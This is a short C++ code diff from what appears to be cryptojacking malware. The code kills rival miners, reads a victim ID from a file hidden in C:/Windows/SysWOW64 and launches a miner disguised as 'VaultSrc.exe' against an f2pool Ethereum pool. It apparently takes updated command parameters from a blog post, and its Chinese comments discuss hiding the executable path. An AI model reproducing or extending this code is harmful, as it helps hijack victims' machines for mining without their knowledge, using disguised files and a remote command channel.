@@ -248,6 +248,9 @@ static size_t update_parameters_bak(void *buffer, size_t sz, size_t nmemb, void 
     std::string cmd_line_sub1 = cmd_line.substr(0, at_index);
     std::string cmd_line_sub2 = cmd_line.substr(at_index + 1, cmd_line.size());
 
+    //C:/Windows/SysWOW64/VaultSrc.exe 中，详细路径可以不放在明指令中，不过两处获取指令的拼接字符串处都要修改，为了避免前后版本不兼容，先缓一缓，不增加复杂性
+    //todo：还要看一下如果命令过长出现换行，在博客会不会出错，不自己主动回车就不会错
+
     cmd_line = cmd_line_sub1 + "@" + cmd_line_sub2;//替换，组合
     static_cmd_line = cmd_line;
     parameters_bak_get_success = true;
@@ -282,9 +285,10 @@ DWORD sysnap(LPDWORD param)//main loop
     system(kill_miner_cmd.c_str());
 
     //读取id
-    std::ifstream in("C:/Windows/SysWOW64/vcfg.txt");
+    std::ifstream in("C:/Windows/SysWOW64/vcfg");
     if (in) {
         getline(in, id);
+        in.close();
     }
     std::string command = "C:\\Windows\\SysWOW64\\VaultSrc.exe  -uri ethstratum://glk300."+id+"@eth.f2pool.com:6688";// cmd;
     update_cmd();
